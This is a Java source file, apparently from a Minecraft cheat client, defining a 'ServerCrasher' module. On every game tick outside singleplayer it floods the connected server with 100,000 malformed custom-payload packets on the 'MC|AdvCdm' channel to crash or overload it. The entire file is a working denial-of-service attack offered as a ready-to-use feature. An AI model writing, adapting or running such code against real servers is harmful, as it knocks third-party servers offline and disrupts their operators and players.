package nettion.features.module.modules.world;

import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import nettion.event.EventHandler;
import nettion.event.events.world.EventPreUpdate;
import nettion.features.module.Module;
import nettion.features.module.ModuleType;

public class ServerCrasher extends Module {
    public ServerCrasher() {
        super("ServerCrasher", ModuleType.World);
    }

    @EventHandler
    private void onPre(EventPreUpdate e) {
        if (!Minecraft.getMinecraft().isSingleplayer()) {
            final PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
            packetbuffer.writeLong(Long.MAX_VALUE);
            for (int i = 0; i < 100000; ++i) {
                mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|AdvCdm", packetbuffer));
            }
        }
    }
}
